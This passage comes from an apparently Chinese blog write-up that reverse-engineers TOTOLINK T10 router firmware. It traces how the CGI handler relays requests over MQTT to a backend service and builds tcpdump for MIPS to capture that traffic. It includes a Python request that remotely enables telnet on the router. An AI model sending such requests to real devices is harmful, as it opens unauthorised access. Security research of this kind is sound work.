src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514100251357.png\" alt=\"image-20230514100251357\"></p>\n<p>​\t\tweb_getData的参数可以往前追溯分析,</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v23 = *(_DWORD *)(cJSON_GetObjectItem(v13, <span class=\"string\">&quot;topicurl&quot;</span>) + <span class=\"number\">16</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\tv23: topicurl的值, 例如setting&#x2F;getPasswordCfg</p>\n<p>​\t\tv30: 其他的参数值</p>\n<p>​\t\t那么这两个函数又是在哪里呢? 搜索发现是在libmosquitto.so库里,它是一个开源的组件,就是由它来负责具体的mqtt消息的处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -rin set_CSTEInfo</span><br><span class=\"line\">Binary file ./lib/libmosquitto.so matches</span><br><span class=\"line\">Binary file ./web_cste/cgi-bin/cstecgi.cgi matches</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510153255735.png\" alt=\"image-20230510153255735\"></p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514102745718.png\" alt=\"image-20230514102745718\"></p>\n<p>v16[0]  0 </p>\n<p>v16[1]  1883 </p>\n<p>v16[2]  127.0.0.1</p>\n<p>v16[3] </p>\n<p>v16[4]  totolink&#x2F;router&#x2F;setting&#x2F;setxxxxCfg</p>\n<p>v16这个数组即发送的请求,传到client_config_load,然后传到  v10 &#x3D; sub_F8DC(a1, a2, a3, a4);</p>\n<p>​\t\t可以看到,它会给消息分配一块堆空间,然后存储到这里</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> ( mosquitto_sub_topic_check(*(_DWORD *)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>))) == <span class=\"number\">3</span> )</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     <span class=\"built_in\">fprintf</span>(</span><br><span class=\"line\">       <span class=\"built_in\">stderr</span>,</span><br><span class=\"line\">       <span class=\"string\">&quot;Error: Invalid subscription topic &#x27;%s&#x27;, are all &#x27;+&#x27; and &#x27;#&#x27; wildcards correct?\\n&quot;</span>,</span><br><span class=\"line\">       *(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>)));</span><br><span class=\"line\">     <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   ++*(_DWORD *)(a1 + <span class=\"number\">96</span>);</span><br><span class=\"line\">   *(_DWORD *)(a1 + <span class=\"number\">92</span>) = <span class=\"built_in\">realloc</span>(*(<span class=\"type\">void</span> **)(a1 + <span class=\"number\">92</span>), <span class=\"number\">4</span> * *(_DWORD *)(a1 + <span class=\"number\">96</span>));</span><br><span class=\"line\">   v5 = (<span class=\"type\">char</span> **)(*(_DWORD *)(a1 + <span class=\"number\">92</span>) + <span class=\"number\">4</span> * (*(_DWORD *)(a1 + <span class=\"number\">96</span>) - <span class=\"number\">1</span>));</span><br><span class=\"line\">   *v5 = strdup(*(<span class=\"type\">const</span> <span class=\"type\">char</span> **)(a4 + <span class=\"number\">4</span> * (i + <span class=\"number\">1</span>)));</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"4-2-4-如何加载库的呢\"><a href=\"#4-2-4-如何加载库的呢\" class=\"headerlink\" title=\"4.2.4 如何加载库的呢?\"></a>4.2.4 如何加载库的呢?</h3><p>​\t\t进行逆向推理,首先要找是谁加载了system.so\t\t</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;system.so&quot;</span></span><br><span class=\"line\">Binary file ./bin/yddns matches</span><br><span class=\"line\">Binary file ./bin/pppoe-discovery matches</span><br><span class=\"line\">Binary file ./bin/csteDriverConnMachine matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t查看了一下这几个文件,发现都没有什么线索,根据网上的资料调查会发现,其实是通过dlopen这个方式加载库,所以.so和system可能进行了拼接,直接搜system就太多了,所以可以搜索路径lib&#x2F;cste_modules</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;lib/cste_modules&quot;</span></span><br><span class=\"line\">Binary file ./bin/cste_sub matches</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t所以是cste_sub加载了system,在cute_sub的 <font color=\"red\">load_modules()</font>函数中,找到如下加载库的代码,可以看到,进行了路径拼接,以及用opendir和readdir读取目录中的文件.</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094355795.png\" alt=\"image-20230514094355795\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span>:<span class=\"number\">1883</span>            <span class=\"number\">0.0</span><span class=\"number\">.0</span><span class=\"number\">.0</span>:*               LISTEN      <span class=\"number\">1329</span>/cs_broker</span><br><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">1883</span>          <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">56383</span>         ESTABLISHED <span class=\"number\">1329</span>/cs_broker</span><br><span class=\"line\">tcp        <span class=\"number\">0</span>      <span class=\"number\">0</span> <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">56383</span>         <span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>:<span class=\"number\">1883</span>          ESTABLISHED <span class=\"number\">1335</span>/cste_sub</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t根据前面查到的端口可以进一步分析,首先1883是mqtt端口,cs_broker用了这个端口,所以它就是代理,那么需要找客户端和服务端,客户端很明显,就是&#x2F;cgi-bin&#x2F;cstecgi.cgi,那么服务端呢,也很明显了,就是cste_sub,它与代理始终建立了双向链接</p>\n<h3 id=\"4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢\"><a href=\"#4-2-5-cgi-bin-x2F-cstecgi-cgi又是如何把消息传送给cs-broker的呢\" class=\"headerlink\" title=\"4.2.5 cgi-bin&#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?\"></a>4.2.5 cgi-bin&#x2F;cstecgi.cgi又是如何把消息传送给cs_broker的呢?</h3><p>​\t\t在这里与1883代理进行消息转发</p>\n<p>​\t\t<img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514170632459.png\" alt=\"image-20230514170632459\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(base) ➜  squashfs-root grep -irn <span class=\"string\">&quot;set_CSTEinfo&quot;</span></span><br><span class=\"line\">Binary file ./lib/libmosquitto.so matches</span><br><span class=\"line\">Binary file ./web_cste/cgi-bin/cstecgi.cgi matches</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以发现这两个函数来自于libmosquitto.so这个库,所以说totolink的mqtt是基于这个库来运行的</p>\n<h3 id=\"4-2-6-mqtt代理如何和服务端和客户端通信的呢\"><a href=\"#4-2-6-mqtt代理如何和服务端和客户端通信的呢\" class=\"headerlink\" title=\"4.2.6 mqtt代理如何和服务端和客户端通信的呢?\"></a>4.2.6 mqtt代理如何和服务端和客户端通信的呢?</h3><p>​\t\t也就是说那么 cs_broker是怎么接收cgi-bin&#x2F;cstecgi.cgi的消息的呢? 又是怎么转发消息到cste_sub的呢?</p>\n<h4 id=\"4-2-6-1-mqtt代理与客户端通信\"><a href=\"#4-2-6-1-mqtt代理与客户端通信\" class=\"headerlink\" title=\"4.2.6.1 mqtt代理与客户端通信\"></a>4.2.6.1 mqtt代理与客户端通信</h4><p>​\t\t要有一个listen等待接收消息,cs_broker主函数中的mqtt3_socket_listen函数.获取传来的地址,解析数据,建立socket</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095808403.png\" alt=\"image-20230514095808403\"></p>\n<h4 id=\"4-2-6-2-与服务端通信\"><a href=\"#4-2-6-2-与服务端通信\" class=\"headerlink\" title=\"4.2.6.2 与服务端通信\"></a>4.2.6.2 与服务端通信</h4><p>​\t\t肯定要有一个connect进行连接</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514095637378.png\" alt=\"image-20230514095637378\">\t</p>\n<h3 id=\"4-2-7-完整的流程\"><a href=\"#4-2-7-完整的流程\" class=\"headerlink\" title=\"4.2.7 完整的流程\"></a>4.2.7 完整的流程</h3><p>​\t分析完登陆和后台的这个功能大概梳理清楚了程序的运行逻辑,它不是直接调用后端的接口,而是通过mqtt通信到后端来处理请求然后返回,所以不论前端的什么请求,都会转化成mqtt的请求包,所以对80端口的请求,也可以通过构造mqtt数据包来执行</p>\n<p>​\t此外还分析了一下系统的启动流程等,最后总结成流程图</p>\n<p><img src=\"/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514094607650.png\" alt=\"image-20230514094607650\"></p>\n<h1 id=\"五、mqtt分析\"><a href=\"#五、mqtt分析\" class=\"headerlink\" title=\"五、mqtt分析\"></a>五、mqtt分析</h1><h2 id=\"5-1-抓包分析-以telnet为例\"><a href=\"#5-1-抓包分析-以telnet为例\" class=\"headerlink\" title=\"5.1 抓包分析:(以telnet为例)\"></a>5.1 抓包分析:(以telnet为例)</h2><h3 id=\"5-1-1-安装libpcap-x2F-tcpdump\"><a href=\"#5-1-1-安装libpcap-x2F-tcpdump\" class=\"headerlink\" title=\"5.1.1 安装libpcap&#x2F;tcpdump\"></a>5.1.1 安装libpcap&#x2F;tcpdump</h3><ol>\n<li>官网下载tcpdump和libpcap</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/the-tcpdump-group/tcpdump</span><br><span class=\"line\">git clone https://github.com/the-tcpdump-group/libpcap</span><br></pre></td></tr></table></figure>\n\n<p>Git clone的版本比较新,有所不同,可以用这个</p>\n<p><a href=\"https://www.tcpdump.org/old_releases.html\">https://www.tcpdump.org/old_releases.html</a></p>\n<h4 id=\"5-1-1-1-libpcap\"><a href=\"#5-1-1-1-libpcap\" class=\"headerlink\" title=\"5.1.1.1 libpcap\"></a>5.1.1.1 libpcap</h4><p>先安装两个依赖</p>\n<p>先安装flex</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#libpcap 1.1要求flex必须在2.4.6及以上</span></span><br><span class=\"line\">wget http:<span class=\"comment\">//prdownloads.sourceforge.net/flex/flex-2.5.36.tar.gz</span></span><br><span class=\"line\">tar -xzvf flex<span class=\"number\">-2.5</span><span class=\"number\">.36</span>.tar.gz</span><br><span class=\"line\">cd flex<span class=\"number\">-2.5</span><span class=\"number\">.36</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>安装bison</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//ftp.gnu.org/gnu/bison/bison-2.4.tar.gz</span></span><br><span class=\"line\">tar -xzvf bison<span class=\"number\">-2.4</span>.tar.gz</span><br><span class=\"line\">cd bison<span class=\"number\">-2.4</span>/</span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n<p>安装libpcap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http:<span class=\"comment\">//www.tcpdump.org/release/libpcap-1.1.1.tar.gz</span></span><br><span class=\"line\">tar -xzvf libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span>.tar.gz</span><br><span class=\"line\">cd libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n\n<p>–prefix&#x3D;&#x2F;usr指定软件安装路径</p>\n<p>报错处理</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/net/libpcap<span class=\"number\">-1.1</span><span class=\"number\">.1</span><span class=\"meta\"># make -j</span></span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -c scanner.c</span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -c ./pcap-linux.c</span><br><span class=\"line\">gcc -O2 -fpic -I.  -DHAVE_CONFIG_H  -D_U_=<span class=\"string\">&quot;__attribute__((unused))&quot;</span> -Dyylval=pcap_lval -c grammar.c</span><br><span class=\"line\">./pcap-linux.c: In function ‘pcap_read_packet’:</span><br><span class=\"line\">./pcap-linux.c:<span class=\"number\">1555</span>:<span class=\"number\">24</span>: error: ‘SIOCGSTAMP’ undeclared (first use in this function); did you mean ‘SIOCGIWAP’?</span><br><span class=\"line\"> <span class=\"number\">1555</span> |  <span class=\"keyword\">if</span> (ioctl(handle-&gt;fd, SIOCGSTAMP, &amp;pcap_header.ts) == <span class=\"number\">-1</span>) &#123;</span><br><span class=\"line\">      |                        ^~~~~~~~~~</span><br><span class=\"line\">      |                        SIOCGIWAP</span><br><span class=\"line\">./pcap-linux.c:<span class=\"number\">1555</span>:<span class=\"number\">24</span>: note: each undeclared identifier is reported only once <span class=\"keyword\">for</span> each function it appears in</span><br><span class=\"line\">make: *** [Makefile:<span class=\"number\">81</span>: pcap-linux.o] Error <span class=\"number\">1</span></span><br><span class=\"line\">make: *** Waiting <span class=\"keyword\">for</span> unfinished jobs....</span><br><span class=\"line\">   </span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://blog.csdn.net/liangjian990709/article/details/111494494\">https://blog.csdn.net/liangjian990709/article/details/111494494</a></p>\n<p><a href=\"https://github.com/LibtraceTeam/libtrace/issues/117\">https://github.com/LibtraceTeam/libtrace/issues/117</a></p>\n<p>报错是说找不到这个宏的定义,找到出问题的文件pcap-linux.c,加上头文件即可 <strong>#include &lt;linux&#x2F;sockios.h&gt;</strong></p>\n<p>验证是否成功</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;pcap.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span> &#123;</span><br><span class=\"line\"><span class=\"type\">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class=\"line\"><span class=\"type\">pcap_if_t</span>* devs;</span><br><span class=\"line\"><span class=\"type\">pcap_if_t</span>* d;</span><br><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> i = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//获取全部的dev</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"number\">-1</span> == pcap_findalldevs(&amp;devs, errbuf)) &#123;</span><br><span class=\"line\"><span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">&quot;Could not list device: %s\\n&quot;</span>, errbuf);</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">d = devs;</span><br><span class=\"line\"><span class=\"keyword\">while</span> (d-&gt;next != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\"><span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d:%s\\n&quot;</span>, i++, d-&gt;name);</span><br><span class=\"line\">d = d-&gt;next;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//释放所有获取的dev</span></span><br><span class=\"line\">pcap_freealldevs(devs);</span><br><span class=\"line\"><span class=\"keyword\">return</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>gcc test.c -lpcap -L&#x2F;usr&#x2F;lib&#x2F;libpcap.so</p>\n<p>-lpcap然后指定安装路径</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@vultr:~/net# ./a.out</span><br><span class=\"line\"><span class=\"number\">0</span>:docker0</span><br><span class=\"line\"><span class=\"number\">1</span>:tun0</span><br><span class=\"line\"><span class=\"number\">2</span>:enp1s0</span><br><span class=\"line\"><span class=\"number\">3</span>:virbr2</span><br><span class=\"line\"><span class=\"number\">4</span>:tap2</span><br><span class=\"line\"><span class=\"number\">5</span>:br-bb76d9e6caa6</span><br><span class=\"line\"><span class=\"number\">6</span>:any</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://www.coder4.com/archives/1001\">https://www.coder4.com/archives/1001</a></p>\n<h4 id=\"5-1-1-2-tcpdump\"><a href=\"#5-1-1-2-tcpdump\" class=\"headerlink\" title=\"5.1.1.2 tcpdump\"></a>5.1.1.2 tcpdump</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget https:<span class=\"comment\">//www.tcpdump.org/release/tcpdump-4.1.1.tar.gz</span></span><br><span class=\"line\">tar zxvf tcpdump<span class=\"number\">-4.1</span><span class=\"number\">.1</span>.tar.gz</span><br><span class=\"line\">cd tcpdump<span class=\"number\">-4.1</span><span class=\"number\">.1</span></span><br><span class=\"line\">./configure --prefix=/usr</span><br><span class=\"line\">make -j &amp;&amp; make install</span><br></pre></td></tr></table></figure>\n\n\n\n<p>安装完直接命令输入 tcpdump进行测试</p>\n<h4 id=\"5-1-1-3-交叉编译mipsel版tcpdump\"><a href=\"#5-1-1-3-交叉编译mipsel版tcpdump\" class=\"headerlink\" title=\"5.1.1.3 交叉编译mipsel版tcpdump\"></a>5.1.1.3 交叉编译mipsel版tcpdump</h4><p>安装mipsel gcc</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt install gcc-mipsel-linux-gnu</span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译libpcap (重新解压一份源码)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure --prefix=/home/test/mipsel_libpcap     #该目录根据情况更改</span><br><span class=\"line\">/configure --host=mipsel-linux --with-pcap=linux --prefix=/home/test/mipsel_libpcap</span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc</span><br><span class=\"line\">make install CC=mipsel-linux-gnu-gcc       #编译的libpcap安装到了/home/test/mipsel_libpcap目录下</span><br></pre></td></tr></table></figure>\n\n<p>编译tcpdump</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">动态链接</span><br><span class=\"line\">./configure </span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc CFLAGS=<span class=\"string\">&#x27;-I/home/test/mipsel_libpcap/include&#x27;</span> LDFLAGS=<span class=\"string\">&#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\">静态链接</span><br><span class=\"line\">    </span><br><span class=\"line\">./configure</span><br><span class=\"line\">make CC=mipsel-linux-gnu-gcc CFLAGS=<span class=\"string\">&#x27;-I/home/test/mipsel_libpcap/include -static&#x27;</span> LDFLAGS=<span class=\"string\">&#x27;-L/home/test/mipsel_libpcap/lib/libpcap.a -static&#x27;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p>编译的时候报错,应该是版本太老了….然后….</p>\n<p>很多个版本一直报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> pcap_loop... no</span><br><span class=\"line\">configure: error: This is a bug, please follow the guidelines in CONTRIBUTING and include the</span><br><span class=\"line\">config.<span class=\"built_in\">log</span> file in your report.  If you have downloaded libpcap from</span><br><span class=\"line\">tcpdump.org, and built it yourself, please also include the config.<span class=\"built_in\">log</span></span><br><span class=\"line\">file from the libpcap source directory, the Makefile from the libpcap</span><br><span class=\"line\">  urce directory, and the output of the make process <span class=\"keyword\">for</span> libpcap, as</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>2010就好了</p>\n<p>不过最后还是有点问题,没有编译成功,暂时先放一下,在github上能搜到编译好的,先用着</p>\n<p><a href=\"https://github.com/badmonkey7/tcpdump-static\">https://github.com/badmonkey7/tcpdump-static</a></p>\n<h3 id=\"5-1-2-流量包分析\"><a href=\"#5-1-2-流量包分析\" class=\"headerlink\" title=\"5.1.2 流量包分析\"></a>5.1.2 流量包分析</h3><p>tcp开启监听,然后mqtt发送订阅(其实不行,这个包不完全,应该走80端口的服务才行)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">response = requests.post(<span class=\"string\">&quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&quot;</span>,data=<span class=\"string\">&#x27;&#123;&quot;topicurl&quot;:&quot;setting/setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>.&#x2F;tcpdump-mipsel -i any  -w .&#x2F;test1.pcap</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./tcpdump-mipsel -i lo -w ./test.pcap</span><br></pre></td></tr></table></figure>\n\n<p>获取流量后,利用base64编码把数据包拿到</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # 编码过程</span><br><span class=\"line\"># 将base64编码的内容保存到本地文件pcap64</span><br><span class=\"line\">cat pcap64 | base64 -d &gt; test.pcap          # 解码过程</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​\t\t不知道为什么一发送订阅,连接就挂了..所以开一个nohup来放到后台运行,断了后重新登录,kill掉进程就得到数据包了,并且如果想抓80的话,要多抓几个网卡,具体是哪个还没测试(-i any抓全部)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># ./tcpdump-mipsel -i lo -w ./test.pcap</span><br><span class=\"line\">tcpdump-mipsel: listening on lo, link-type <span class=\"title function_\">EN10MB</span> <span class=\"params\">(Ethernet)</span>, snapshot length 262144 bytes</span><br><span class=\"line\">Connection closed by foreign host.</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\">./busybox-mipsel  nohup ./tcpdump-mipsel  -i any -w ./test.pcap</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能够看到三次握手四次挥手以及订阅包,推送包等等</p>\n<p><img 